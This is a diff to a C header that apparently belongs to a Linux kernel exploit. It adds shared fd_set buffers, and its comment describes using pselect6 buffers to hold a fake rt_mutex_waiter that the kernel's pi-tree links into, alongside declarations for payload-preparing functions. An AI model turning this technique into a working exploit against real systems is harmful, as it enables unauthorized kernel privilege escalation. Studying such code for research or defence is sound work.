@@ -373,6 +373,20 @@ int prepare_skb_payload(uintptr_t base, int payload_mode);
 uintptr_t prepare_kernel_page(int payload_mode);
 uintptr_t prepare_good_kernel_page(int payload_mode);
 
+/*
+ * The slide pselect6 fd_set buffers.  They embed the fake rt_mutex_waiter and
+ * the kernel rt_mutex pi-tree caches rb_node pointers into them, so the pages
+ * must outlive every forked exploit child.  preload.c creates this region in
+ * the supervisor load() constructor (MAP_SHARED|MAP_ANONYMOUS); slide_app.c
+ * indexes into the preallocated fd_set members instead of heap-allocating.
+ */
+struct slide_shared_fdsets {
+  fd_set in;
+  fd_set out;
+  fd_set ex;
+};
+extern struct slide_shared_fdsets *slide_shared_fds;
+
 void fdset_put_word(fd_set *set, int word, uint64_t value);
 void open_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
